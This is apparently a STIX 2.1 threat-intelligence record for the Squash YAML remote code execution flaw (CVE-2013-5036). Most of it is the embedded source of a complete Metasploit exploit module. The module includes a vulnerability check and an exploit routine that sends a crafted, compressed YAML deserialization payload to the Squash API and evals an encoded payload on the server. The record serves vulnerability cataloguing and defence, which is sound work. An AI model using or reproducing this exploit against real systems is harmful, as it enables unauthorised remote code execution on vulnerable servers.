{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eba17242-045f-4a96-8120-abaefc64912c",
    "created": "2024-08-14T17:13:33.012155Z",
    "modified": "2024-08-14T17:13:33.012159Z",
    "name": "Squash YAML Code Execution",
    "description": " This module exploits a remote code execution vulnerability in the YAML request processor of the Squash application. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/squash_yaml_exec.rb",
            "external_id": "squash_yaml_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://ceriksen.com/2013/08/06/squash-remote-code-execution-vulnerability-advisory/"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-5036"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Squash YAML Code Execution',\n      'Description'    => %q{\n          This module exploits a remote code execution vulnerability in the\n        YAML request processor of the Squash application.\n      },\n      'Author'         =>\n        [\n          'Charlie Eriksen' # Discovery, initial exploit\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://ceriksen.com/2013/08/06/squash-remote-code-execution-vulnerability-advisory/'],\n          [ 'OSVDB', '95992'],\n          [ 'CVE', '2013-5036']\n        ],\n      'Platform'       => 'ruby',\n      'Arch'           => ARCH_RUBY,\n      'Privileged'     => false,\n      'Targets'        =>\t[ ['Automatic', {} ] ],\n      'DisclosureDate' => '2013-08-06',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'The path to a vulnerable Ruby on Rails application', \"/\"])\n      ])\n\n  end\n\n  def check\n    response = send_request_cgi({\n        'uri'     => normalize_uri(target_uri.path, \"api\", \"1.0\", \"deobfuscation\"),\n        'method'  => 'POST',\n        'ctype'   => 'application/json',\n      })\n\n    if response.code == 422\n      vprint_status(\"Got HTTP 422 result, target may be vulnerable\")\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    code = Rex::Text.encode_base64(payload.encoded)\n    yaml =\t\"--- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection\\n\" +\n        \"'#{rand_text_alpha(rand(8)+1)};eval(%[#{code}].unpack(%[m0])[0]);' \" +\n        \": !ruby/object:OpenStruct\\n table:\\n  :defaults: {}\\n\"\n    payload = Rex::Text.encode_base64(Zlib::Deflate.deflate(yaml)).gsub(\"\\n\", \"\")\n    data = \"{\\\"api_key\\\":\\\"1\\\",\\\"environment\\\":\\\"production\\\",\\\"build\\\":\\\"1\\\",\\\"namespace\\\":\\\"#{payload}\\\"}\"\n\n    send_request_cgi({\n      'uri'     => normalize_uri(target_uri.path, \"api\", \"1.0\", \"deobfuscation\"),\n      'method'  => 'POST',\n      'ctype'   => 'application/json',\n      'data'    => data\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-08-06",
    "x_mitre_platforms": [
        "ruby'"
    ]
}